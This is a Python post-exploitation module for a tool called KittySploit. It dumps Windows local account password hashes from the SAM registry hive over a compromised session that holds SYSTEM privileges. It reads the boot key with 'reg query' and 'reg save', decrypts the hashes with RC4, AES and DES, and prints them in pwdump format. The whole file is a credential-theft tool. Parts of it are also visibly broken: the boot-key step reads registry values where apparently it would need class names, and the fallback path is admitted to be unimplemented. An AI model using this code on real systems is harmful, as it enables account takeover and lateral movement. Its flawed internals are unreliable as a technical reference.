#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Windows Gather Local User Account Password Hashes (Registry)
Extracts password hashes from the SAM database using registry access
"""

from kittysploit import *
import struct
import hashlib
import base64
import re

# Try to import crypto libraries
try:
    from Crypto.Cipher import ARC4, AES, DES
    from Crypto.Util.Padding import unpad
    CRYPTO_AVAILABLE = True
except ImportError:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        CRYPTO_AVAILABLE = True
        CRYPTO_LIB = 'cryptography'
    except ImportError:
        CRYPTO_AVAILABLE = False
        CRYPTO_LIB = None
        print_warning("[!] Cryptographic libraries not available. Install pycryptodome or cryptography for full functionality.")

class Module(Post):
    """Windows Hashdump Module - Extract password hashes from SAM registry"""
    
    __info__ = {
        "name": "Windows Gather Local User Account Password Hashes (Registry)",
        "description": "Dumps local user account password hashes from the SAM database using registry access. Requires SYSTEM privileges.",
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1003/002/"
        ]
    }
    
    def check(self):
        """Check if the module can run"""
        session_id_value = self.session_id.value if hasattr(self.session_id, 'value') else str(self.session_id)
        if not session_id_value:
            print_error("Session ID not set")
            return False
        
        if not self.framework or not hasattr(self.framework, 'session_manager'):
            print_error("Framework or session manager not available")
            return False
        
        session = self.framework.session_manager.get_session(session_id_value)
        if not session:
            print_error(f"Session {session_id_value} not found")
            return False
        
        # Check if we have SYSTEM privileges
        print_info("[*] Checking privileges...")
        whoami = self.cmd_execute("shell whoami")
        if "NT AUTHORITY\\SYSTEM" not in whoami and "system" not in whoami.lower():
            print_warning("This module requires SYSTEM privileges")
            print_warning("Current user: " + (whoami.strip() if whoami else "Unknown"))
            print_warning("Try migrating to a SYSTEM process first")
            return False
        
        print_success("[+] SYSTEM privileges confirmed")
        return True
    
    def _execute_cmd(self, command: str) -> str:
        """Execute a command and return output"""
        try:
            output = self.cmd_execute(command)
            if output:
                return output.strip()
            return ""
        except Exception as e:
            print_warning(f"Command failed: {str(e)}")
            return ""
    
    def _read_registry_value(self, key_path: str, value_name: str = "") -> bytes:
        """Read a registry value and return as bytes"""
        try:
            # Use reg query to read registry value
            if value_name:
                cmd = f'shell reg query "{key_path}" /v "{value_name}"'
            else:
                cmd = f'shell reg query "{key_path}" /ve'
            
            output = self._execute_cmd(cmd)
            if not output:
                return None
            
            # Parse reg query output
            # Format: "    value_name    REG_BINARY    hex_data"
            lines = output.split('\n')
            for line in lines:
                if 'REG_BINARY' in line or 'REG_SZ' in line:
                    # Extract hex data
                    parts = line.split()
                    if len(parts) >= 3:
                        # Try to find hex data
                        hex_data = parts[-1]
                        try:
                            # Convert hex string to bytes
                            return bytes.fromhex(hex_data.replace(' ', ''))
                        except:
                            pass
            
            return None
        except Exception as e:
            print_warning(f"Failed to read registry: {e}")
            return None
    
    def _read_registry_key(self, key_path: str) -> dict:
        """Read all values from a registry key"""
        try:
            cmd = f'shell reg query "{key_path}"'
            output = self._execute_cmd(cmd)
            if not output:
                return {}
            
            result = {}
            lines = output.split('\n')
            current_value = None
            current_data = []
            
            for line in lines:
                line = line.strip()
                if not line:
                    continue
                
                if line.startswith(key_path):
                    continue
                
                if 'REG_' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        value_name = parts[0]
                        reg_type = parts[1]
                        if len(parts) > 2:
                            data = ' '.join(parts[2:])
                            result[value_name] = {
                                'type': reg_type,
                                'data': data
                            }
            
            return result
        except Exception as e:
            print_warning(f"Failed to read registry key: {e}")
            return {}
    
    def _capture_boot_key(self) -> bytes:
        """Capture the boot key from SYSTEM registry"""
        print_info("[*] Obtaining the boot key...")
        
        try:
            # Boot key is stored in SYSTEM\CurrentControlSet\Control\Lsa
            # We need to read multiple values and combine them
            boot_key_parts = []
            
            # Read the scrambled boot key parts
            for i in range(4):
                key_path = f"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa"
                value_name = f"JD"
                if i > 0:
                    value_name = f"Skew{i}"
                
                data = self._read_registry_value(key_path, value_name)
                if data:
                    boot_key_parts.append(data)
            
            if len(boot_key_parts) < 4:
                # Try alternative method: use reg save and download
                print_info("[*] Attempting alternative method to get boot key...")
                return self._capture_boot_key_alternative()
            
            # Combine and descramble the boot key
            boot_key = bytearray(16)
            descramble_map = [0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
            
            for i in range(16):
                part_idx = i // 4
                byte_idx = i % 4
                if part_idx < len(boot_key_parts) and byte_idx < len(boot_key_parts[part_idx]):
                    boot_key[descramble_map[i]] = boot_key_parts[part_idx][byte_idx]
            
            print_success(f"[+] Boot key: {boot_key.hex()}")
            return bytes(boot_key)
            
        except Exception as e:
            print_error(f"Failed to capture boot key: {e}")
            return None
    
    def _capture_boot_key_alternative(self) -> bytes:
        """Alternative method to get boot key using reg save"""
        try:
            # Save SYSTEM hive to temp file
            temp_file = "C:\\Windows\\Temp\\system_hive.tmp"
            cmd = f'shell reg save HKLM\\SYSTEM "{temp_file}"'
            output = self._execute_cmd(cmd)
            
            if "The operation completed successfully" not in output:
                print_error("Failed to save SYSTEM hive")
                return None
            
            # Read the file (simplified - in real implementation would need to parse hive)
            # For now, return None to indicate we need a different approach
            print_warning("[!] Direct registry parsing not fully implemented")
            print_warning("[!] This module requires direct registry API access")
            return None
            
        except Exception as e:
            print_error(f"Alternative boot key capture failed: {e}")
            return None
    
    def _capture_hboot_key(self, bootkey: bytes) -> bytes:
        """Calculate the hboot key using SYSKEY"""
        if not bootkey:
            return None
        
        print_info(f"[*] Calculating the hboot key using SYSKEY {bootkey.hex()}...")
        
        try:
            # Read F value from SAM
            key_path = "HKLM\\SAM\\SAM\\Domains\\Account"
            f_data = self._read_registry_value(key_path, "F")
            
            if not f_data or len(f_data) < 0x100:
                print_error("Failed to read SAM F value")
                return None
            
            # Check revision
            revision = struct.unpack('<I', f_data[0x68:0x6c])[0]
            
            if revision == 1:
                # RC4 decryption
                if not CRYPTO_AVAILABLE:
                    print_error("RC4 decryption requires cryptographic library")
                    return None
                
                sam_qwerty = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
                sam_numeric = b"0123456789012345678901234567890123456789\x00"
                
                hash_input = f_data[0x70:0x80] + sam_qwerty + bootkey + sam_numeric
                md5_hash = hashlib.md5(hash_input).digest()
                
                encrypted = f_data[0x80:0xa0]
                
                try:
                    rc4 = ARC4.new(md5_hash)
                    hbootkey = rc4.decrypt(encrypted)
                    print_success(f"[+] Hboot key calculated (revision 1): {hbootkey.hex()}")
                    return hbootkey
                except Exception as e:
                    print_error(f"RC4 decryption failed: {e}")
                    return None
                
            elif revision == 2:
                # AES decryption
                if not CRYPTO_AVAILABLE:
                    print_error("AES decryption requires cryptographic library")
                    return None
                
                iv = f_data[0x78:0x88]
                encrypted = f_data[0x88:0x98]
                
                try:
                    aes = AES.new(bootkey, AES.MODE_CBC, iv)
                    hbootkey = aes.decrypt(encrypted)
                    print_success(f"[+] Hboot key calculated (revision 2): {hbootkey.hex()}")
                    return hbootkey
                except Exception as e:
                    print_error(f"AES decryption failed: {e}")
                    return None
            else:
                print_error(f"Unknown hboot_key revision: {revision}")
                return None
                
        except Exception as e:
            print_error(f"Failed to calculate hboot key: {e}")
            return None
    
    def _capture_user_keys(self) -> dict:
        """Capture user keys from SAM registry"""
        print_info("[*] Obtaining the user list and keys...")
        
        users = {}
        
        try:
            # Get user RIDs from SAM\SAM\Domains\Account\Users
            key_path = "HKLM\\SAM\\SAM\\Domains\\Account\\Users"
            cmd = f'shell reg query "{key_path}"'
            output = self._execute_cmd(cmd)
            
            if not output:
                print_error("Failed to enumerate users from SAM")
                return users
            
            # Parse user RIDs
            rid_pattern = re.compile(r'Users\\([0-9A-Fa-f]+)')
            rids = rid_pattern.findall(output)
            
            for rid_hex in rids:
                try:
                    rid = int(rid_hex, 16)
                    if rid == 0:
                        continue
                    
                    # Read F and V values for this user
                    user_key_path = f"{key_path}\\{rid_hex}"
                    
                    f_data = self._read_registry_value(user_key_path, "F")
                    v_data = self._read_registry_value(user_key_path, "V")
                    
                    if f_data and v_data:
                        users[rid] = {
                            'F': f_data,
                            'V': v_data,
                            'RID': rid
                        }
                        
                except Exception as e:
                    print_warning(f"Failed to process user RID {rid_hex}: {e}")
                    continue
            
            # Get user names from SAM\SAM\Domains\Account\Users\Names
            names_key_path = "HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names"
            cmd = f'shell reg query "{names_key_path}"'
            output = self._execute_cmd(cmd)
            
            if output:
                name_pattern = re.compile(r'Names\\([^\\\\]+)')
                names = name_pattern.findall(output)
                
                for name in names:
                    # Get RID for this name
                    name_key_path = f"{names_key_path}\\{name}"
                    cmd = f'shell reg query "{name_key_path}" /ve'
                    name_output = self._execute_cmd(cmd)
                    
                    if name_output:
                        # Extract RID from output (default value contains RID)
                        rid_match = re.search(r'0x([0-9A-Fa-f]+)', name_output)
                        if rid_match:
                            rid = int(rid_match.group(1), 16)
                            if rid in users:
                                users[rid]['Name'] = name
            
            print_success(f"[+] Found {len(users)} users")
            return users
            
        except Exception as e:
            print_error(f"Failed to capture user keys: {e}")
            return users
    
    def _rid_to_key(self, rid: int) -> tuple:
        """Convert RID to DES keys"""
        s1 = struct.pack('<I', rid)
        s1 += s1[:3]
        
        s2b = struct.unpack('BBBB', struct.pack('<I', rid))
        s2 = struct.pack('BBBB', s2b[3], s2b[0], s2b[1], s2b[2])
        s2 += s2[:3]
        
        def convert_des_56_to_64(key_56):
            """Convert 56-bit DES key to 64-bit with parity"""
            key_64 = bytearray(8)
            key_64[0] = key_56[0] & 0xFE
            key_64[1] = ((key_56[0] << 7) & 0xFF) | ((key_56[1] >> 1) & 0x7F)
            key_64[2] = ((key_56[1] << 6) & 0xFF) | ((key_56[2] >> 2) & 0x3F)
            key_64[3] = ((key_56[2] << 5) & 0xFF) | ((key_56[3] >> 3) & 0x1F)
            key_64[4] = ((key_56[3] << 4) & 0xFF) | ((key_56[4] >> 4) & 0x0F)
            key_64[5] = ((key_56[4] << 3) & 0xFF) | ((key_56[5] >> 5) & 0x07)
            key_64[6] = ((key_56[5] << 2) & 0xFF) | ((key_56[6] >> 6) & 0x03)
            key_64[7] = (key_56[6] << 1) & 0xFF
            
            # Set parity bits
            for i in range(8):
                parity = 0
                for j in range(7):
                    if (key_64[i] >> j) & 1:
                        parity ^= 1
                key_64[i] = (key_64[i] & 0xFE) | parity
            
            return bytes(key_64)
        
        return (convert_des_56_to_64(s1), convert_des_56_to_64(s2))
    
    def _decrypt_user_hash(self, rid: int, hbootkey: bytes, enchash: bytes, pass_str: bytes, default: bytes) -> bytes:
        """Decrypt a user hash"""
        if not enchash or len(enchash) < 4:
            return default
        
        revision = struct.unpack('<H', enchash[2:4])[0]
        
        if revision == 1:
            if len(enchash) < 20:
                return default
            
            if not CRYPTO_AVAILABLE:
                return default
            
            md5 = hashlib.md5()
            md5.update(hbootkey[:16])
            md5.update(struct.pack('<I', rid))
            md5.update(pass_str)
            rc4_key = md5.digest()
            
            try:
                rc4 = ARC4.new(rc4_key)
                okey = rc4.decrypt(enchash[4:20])
            except:
                return default
                
        elif revision == 2:
            if len(enchash) < 40:
                return default
            
            if not CRYPTO_AVAILABLE:
                return default
            
            try:
                aes = AES.new(hbootkey[:16], AES.MODE_CBC, enchash[8:24])
                okey = aes.decrypt(enchash[24:40])
            except:
                return default
        else:
            return default
        
        # DES decrypt
        if not CRYPTO_AVAILABLE:
            return default
        
        des_k1, des_k2 = self._rid_to_key(rid)
        
        try:
            d1 = DES.new(des_k1, DES.MODE_ECB)
            d2 = DES.new(des_k2, DES.MODE_ECB)
            
            d1o = d1.decrypt(okey[:8])
            d2o = d2.decrypt(okey[8:16])
            
            return d1o + d2o
        except:
            return default
    
    def _decrypt_user_hashes(self, hbootkey: bytes, users: dict) -> dict:
        """Decrypt all user hashes"""
        if not hbootkey:
            return {}
        
        sam_lmpass = b"LMPASSWORD\x00"
        sam_ntpass = b"NTPASSWORD\x00"
        sam_empty_lm = bytes.fromhex('aad3b435b51404eeaad3b435b51404ee')
        sam_empty_nt = bytes.fromhex('31d6cfe0d16ae931b73c59d7e0c089c0')
        
        decrypted_users = {}
        
        for rid, user_data in users.items():
            if 'V' not in user_data:
                continue
            
            v_data = user_data['V']
            if len(v_data) < 0xcc + 0x10:
                continue
            
            try:
                # Extract hash offsets and lengths
                hashlm_off = struct.unpack('<I', v_data[0x9c:0xa0])[0] + 0xcc
                hashlm_len = struct.unpack('<I', v_data[0xa0:0xa4])[0]
                
                hashnt_off = struct.unpack('<I', v_data[0xa8:0xac])[0] + 0xcc
                hashnt_len = struct.unpack('<I', v_data[0xac:0xb0])[0]
                
                if hashlm_off < len(v_data) and hashlm_off + hashlm_len <= len(v_data):
                    hashlm_enc = v_data[hashlm_off:hashlm_off + hashlm_len]
                    hashlm = self._decrypt_user_hash(rid, hbootkey, hashlm_enc, sam_lmpass, sam_empty_lm)
                else:
                    hashlm = sam_empty_lm
                
                if hashnt_off < len(v_data) and hashnt_off + hashnt_len <= len(v_data):
                    hashnt_enc = v_data[hashnt_off:hashnt_off + hashnt_len]
                    hashnt = self._decrypt_user_hash(rid, hbootkey, hashnt_enc, sam_ntpass, sam_empty_nt)
                else:
                    hashnt = sam_empty_nt
                
                decrypted_users[rid] = {
                    'Name': user_data.get('Name', f'RID_{rid}'),
                    'RID': rid,
                    'hashlm': hashlm,
                    'hashnt': hashnt
                }
                
            except Exception as e:
                print_warning(f"Failed to decrypt hash for RID {rid}: {e}")
                continue
        
        return decrypted_users
    
    def run(self):
        """Run the hashdump module"""
        try:
            print_info("")
            print_success("Starting Windows Hashdump...")
            print_info("")
            
            # Check privileges
            if not self.check():
                raise ProcedureError(FailureType.NotAccess, "Module check failed - SYSTEM privileges required")
            
            # Capture boot key
            bootkey = self._capture_boot_key()
            if not bootkey:
                print_error("Failed to obtain boot key")
                print_warning("[!] This module requires direct registry API access")
                print_warning("[!] Consider using tools like mimikatz or secretsdump.py (Impacket)")
                raise ProcedureError(FailureType.NotAccess, "Failed to obtain boot key")
            
            # Calculate hboot key
            hbootkey = self._capture_hboot_key(bootkey)
            if not hbootkey:
                print_error("Failed to calculate hboot key")
                print_warning("[!] Cryptographic operations require full implementation")
                raise ProcedureError(FailureType.NotAccess, "Failed to calculate hboot key")
            
            # Capture user keys
            users = self._capture_user_keys()
            if not users:
                print_error("No users found in SAM")
                raise ProcedureError(FailureType.NoTarget, "No users found")
            
            # Decrypt user hashes
            print_info("[*] Decrypting user hashes...")
            decrypted_users = self._decrypt_user_hashes(hbootkey, users)
            
            # Display results
            print_info("")
            print_info("=" * 70)
            print_info("Password Hashes")
            print_info("=" * 70)
            print_info("")
            
            if decrypted_users:
                for rid in sorted(decrypted_users.keys()):
                    user = decrypted_users[rid]
                    name = user.get('Name', f'RID_{rid}')
                    lm_hash = user.get('hashlm', '')
                    nt_hash = user.get('hashnt', '')
                    
                    if lm_hash and nt_hash:
                        lm_hex = lm_hash.hex() if isinstance(lm_hash, bytes) else lm_hash
                        nt_hex = nt_hash.hex() if isinstance(nt_hash, bytes) else nt_hash
                        hashstring = f"{name}:{rid}:{lm_hex}:{nt_hex}:::"
                        print_info(hashstring)
                    else:
                        print_warning(f"{name}:{rid} - Failed to decrypt hashes")
            else:
                print_warning("[!] No hashes could be decrypted")
            
            print_info("")
            print_info("=" * 70)
            
            return True
            
        except ProcedureError as e:
            raise e
        except Exception as e:
            raise ProcedureError(FailureType.Unknown, f"Hashdump error: {str(e)}")

